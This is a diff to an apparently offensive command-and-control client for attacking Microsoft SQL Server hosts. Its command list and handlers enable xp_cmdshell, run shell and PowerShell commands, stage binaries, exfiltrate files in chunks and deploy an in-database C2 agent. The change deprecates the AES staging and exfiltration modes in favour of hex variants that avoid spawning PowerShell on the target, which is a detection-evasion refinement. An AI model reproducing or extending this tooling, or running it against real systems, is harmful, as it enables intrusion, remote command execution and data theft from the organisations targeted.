@@ -18,9 +18,9 @@ Built-in commands (case-insensitive):
     xpinit <host:port> <login> <pass>       enable xp_cmdshell + sp_OA on MSSQL target
     xpshell cmd <cmd>               run cmd.exe command on MSSQL host via xp_cmdshell
     xpshell psh <ps_script>         stage and run PowerShell script on MSSQL host
-    xpstage <payload> [--no-encrypt]        stage binary to MSSQL host via DB channel (base64+AES)
+    xpstage-aes <payload> [--no-encrypt]   [DEPRECATED] stage binary via AES-256-CBC base64 + PowerShell on IIS01; use xpstage-hex instead
     xpstage-hex <payload>                  stage binary via hex SQL + T-SQL ADODB.Stream (no .ps1)
-    xpexfil <remote_path> <local_name> [insert_timeout_s] [chunk_mb]  exfil file from MSSQL host via DB channel (AES-256-CBC, chunked)
+    xpexfil-aes <remote_path> <local_name> [insert_timeout_s] [chunk_mb]  [DEPRECATED] exfil via AES-256-CBC + PowerShell on IIS01; use xpexfil-hex instead
     xpexfil-hex <remote_path> <local_name> [timeout] [chunk_mb]    hex exfil via OPENROWSET(BULK) + T-SQL INSERT; C2 Python decode
     xpagent init                    deploy xpagent in-DB C2 on IIS01 (runs xpagent_init.sql via SB)
     xpagent kill                    drop xpagent database (cleanup)
@@ -163,16 +163,22 @@ class ToneShellShell(C2Client):
                     else:
                         print("usage: xpshell cmd|psh <command_or_script>")
 
-                elif cmd == "xpstage":
+                elif cmd == "xpstage-aes":
                     if not self.session:
                         print("[!] not attached to a session")
                     elif len(parts) < 2:
-                        print("usage: xpstage <payload_name> [--no-encrypt]")
+                        print("usage: xpstage-aes <payload_name> [--no-encrypt]")
                     elif not self._xp.ready():
                         print("[!] run xpinit first")
                     else:
-                        no_enc = len(parts) >= 3 and parts[2] == "--no-encrypt"
-                        self._xp.cmd_xpstage(self, parts[1], encrypt=not no_enc)
+                        print("[DEPRECATED] xpstage-aes spawns PowerShell on IIS01 for AES-256-CBC decrypt.")
+                        print("             Prefer xpstage-hex (no .ps1, no PowerShell on IIS01).")
+                        ans = input("  Continue anyway? [y/N] ").strip().lower()
+                        if ans not in ("y", "yes"):
+                            print("[*] aborted")
+                        else:
+                            no_enc = len(parts) >= 3 and parts[2] == "--no-encrypt"
+                            self._xp.cmd_xpstage(self, parts[1], encrypt=not no_enc)
 
                 elif cmd == "xpstage-hex":
                     if not self.session:
@@ -184,18 +190,24 @@ class ToneShellShell(C2Client):
                     else:
                         self._xp.cmd_xpstage_hex(self, parts[1])
 
-                elif cmd == "xpexfil":
+                elif cmd == "xpexfil-aes":
                     xp_parts = line.split()
                     if not self.session:
                         print("[!] not attached to a session")
                     elif len(xp_parts) < 3:
-                        print("usage: xpexfil <remote_path> <local_name> [insert_timeout_s=600] [chunk_mb=10]")
+                        print("usage: xpexfil-aes <remote_path> <local_name> [insert_timeout_s=600] [chunk_mb=10]")
                     elif not self._xp.ready():
                         print("[!] run xpinit first")
                     else:
-                        t = int(xp_parts[3]) if len(xp_parts) >= 4 else 600
-                        c = int(xp_parts[4]) if len(xp_parts) >= 5 else 10
-                        self._xp.cmd_xpexfil(self, xp_parts[1], xp_parts[2], insert_timeout_s=t, chunk_mb=c)
+                        print("[DEPRECATED] xpexfil-aes spawns N×PowerShell on IIS01 for AES-256-CBC + base64 per chunk.")
+                        print("             Prefer xpexfil-hex (single T-SQL OPENROWSET batch, no process spawn on IIS01).")
+                        ans = input("  Continue anyway? [y/N] ").strip().lower()
+                        if ans not in ("y", "yes"):
+                            print("[*] aborted")
+                        else:
+                            t = int(xp_parts[3]) if len(xp_parts) >= 4 else 600
+                            c = int(xp_parts[4]) if len(xp_parts) >= 5 else 10
+                            self._xp.cmd_xpexfil(self, xp_parts[1], xp_parts[2], insert_timeout_s=t, chunk_mb=c)
 
                 elif cmd == "xpexfil-hex":
                     xp_parts = line.split()
